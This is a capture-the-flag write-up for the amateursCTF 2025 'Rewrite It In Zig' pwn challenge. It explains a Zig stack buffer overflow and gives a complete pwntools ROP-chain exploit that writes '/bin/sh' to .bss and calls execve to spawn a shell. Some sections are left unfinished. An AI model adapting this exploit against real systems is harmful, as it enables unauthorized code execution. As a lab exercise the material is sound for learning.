---
title: "Rewrite It In Zig (amateursCTF 2025)"
summary: "Medium Pwn Challenge - BOF in Zig + ROPchains"
description: "Medium Pwn Challenge - BOF in Zig + ROPchains"
tags: [PWN, medium, writeup, rop, bof]
date: 2025-11-18T23:00:00-05:00
draft: false
searchHidden: false
ShowToc: true
TocOpen: true
hidemeta: false
# weight: 1
---

## Description

Sometimes rust is just a little too safe for me.

Given file: [rewrite-it-zig.tar.gz](/amateursctf-rewrite-it-in-zig/rewrite-it-zig.tar.gz)

---

## Writeup

### Initial Analysis

This challenge is written in [Zig](https://ziglang.org/) and the given source code is:

```zig {linenos=true}
const std = @import("std");
const print = std.debug.print;

pub fn main() void {
    print("you can never have too much zig pwn.\n", .{});

    var backing: [0x100]u8 = undefined;
    var buf: []u8 = &backing;
    buf.len = 0x1000;
    _ = std.io.getStdIn().read(buf) catch {};
}
```

We can see 0x100 or 256 bytes are being allocated on the stack however buffer length is set to 0x1000 (4096 bytes). This allows user to input 4096 bytes into a 256-byte buffer.

![name](/amateursctf-rewrite-it-in-zig/2025-11-17-233231.png#center)
Checksec reveals that we have NX enabled so the stack is non-executable. No injecting shellcode here, instead we have to use Return-Oriented-Programming (ROP). PIE being disabled makes everything easier as our ROP gadgets and BSS data segment will be at a constant address. We have to verify if the stack canary actually exists since Zig binaries handle stack protection differently than C and also bof might bypass the canary depending on the stack layout (we'll come back to this).


### Finding Offset
Lets how many bytes we have to send before we hit the RSP and the return address:
- `pwndbg chal`
- `cyclic 500` (copy this)
- Run the binary `r` then pass the cyclic pattern
- Check what RSP is (the last thing that was on the stack causing the seg fault)
- `cyclic -o uaaaaaab` return offset at **360** (-8 for RBP which we wanna control = **352**)
![name](/amateursctf-rewrite-it-in-zig/2025-11-21-163553.png#center)

### ROP Chain Strategy
The goal is to call `execve("/bin/sh", 0, 0)` ([execve() man page](https://man7.org/linux/man-pages/man2/execve.2.html)) and get a shell so it would've been nice if we had the string "/bin/sh" somewhere in the binary (we don't)  which we could just call here after our padding. `strings | grep '/bin/sh'` doesn't return anything.

(explain why .bss)

#### Stage 1
So we first need to call `read(0, .bss, 8)` to read the 8 byte string "bin/sh" from our input into a writable memory section (.bss)
([read() man page](https://man7.org/linux/man-pages/man2/execve.2.html))
#### Stage 2
Now we can call `execve(.bss, 0, 0)` to spawn a shell (.bss contains our "/bin/sh" string)

### Finding ROP Gadgets
TODO

## Solve script
Completing the script:
```py {linenos=true}
#!/usr/bin/env python3
"""
KEY INSIGHT:
The syscall gadget does more than just syscall - it also adjusts the stack!
  syscall
  add rsp, 0x28  # Skips 40 bytes
  pop rbp        # Pops 8 bytes
  ret
We must add 48 bytes of padding after each syscall to account for this.
"""

from pwn import *

elf = ELF('./chal')
context.binary = elf
context.arch = 'amd64'

# ROP Gadgets
pop_rax = 0x010c5cc4  # pop rax; ret
pop_rdx = 0x010cf9ec  #pop rdx; ret
pop_rsi_pop_rbp = 0x0104a153  # pop rsi; pop rbp; ret
syscall = 0x01038e9a  # syscall; add rsp,0x28; pop rbp; ret

# mov rdi,rdx; xor edx,edx; mov rax,rdi; ret
mov_rdi_rdx_xor_edx = 0x010bc482  # Moves rdx→rdi, zeros rdx, copies rdi→rax


# Writable memory location for /bin/sh string
bss = elf.bss(0x200)

# Buffer is at [rbp-0x160], so we need 0x160 (352) bytes to reach saved RBP
padding = 0x160
fake_rbp = 0xdeadbeefdeadbeef

# ===== STAGE 1: read(0, bss, 8) =====
# Call read syscall to write "/bin/sh\x00" to BSS
stage1 = flat(
    # Set rdi = 0 (stdin file descriptor)
    pop_rdx, 0,
    mov_rdi_rdx_xor_edx,  # rdi=0, rdx=0, rax=0

    # Set rsi = bss (buffer to write to)
    pop_rsi_pop_rbp, bss, 0,

    # Set rdx = 8 (number of bytes to read)
    pop_rdx, 8,

    # Set rax = 0 (read syscall number)
    pop_rax, 0,

    # Call read(0, bss, 8)
    syscall,
    b'A' * 0x28,  # Padding for "add rsp, 0x28"
    0xdeadbeef,   # Fake rbp for "pop rbp"
)

# ===== STAGE 2: execve(bss, 0, 0) =====
# Execute the /bin/sh string we just wrote
stage2 = flat(
    # Set rdi = bss (pointer to "/bin/sh")
    pop_rdx, bss,
    mov_rdi_rdx_xor_edx,  # rdi=bss, rdx=0

    # Set rsi = 0 (argv = NULL)
    pop_rsi_pop_rbp, 0, 0,

    # Set rax = 59 (execve syscall number)
    pop_rax, 59,

    # Call execve(bss, 0, 0)
    syscall,
)

# Build final payload
payload = flat(
    b'A' * padding,  # Fill buffer up to saved RBP
    fake_rbp,        # Overwrite saved RBP
    stage1,          # ROP chain to read /bin/sh
    stage2,          # ROP chain to execute it
)

p = elf.process()
# p = remote('amt.rs', 27193)

p.recvuntil(b'pwn.\n')
p.send(payload)

# Wait for read() syscall, then send /bin/sh
sleep(0.2)
p.send(b'/bin/sh\x00')

success("Shell spawned!")
p.interactive()
```

### Flag

`amateursCTF{i_love_zig_its_my_favorite_language_and_you_will_never_escape_the_zig_pwn_ahahaha}`

---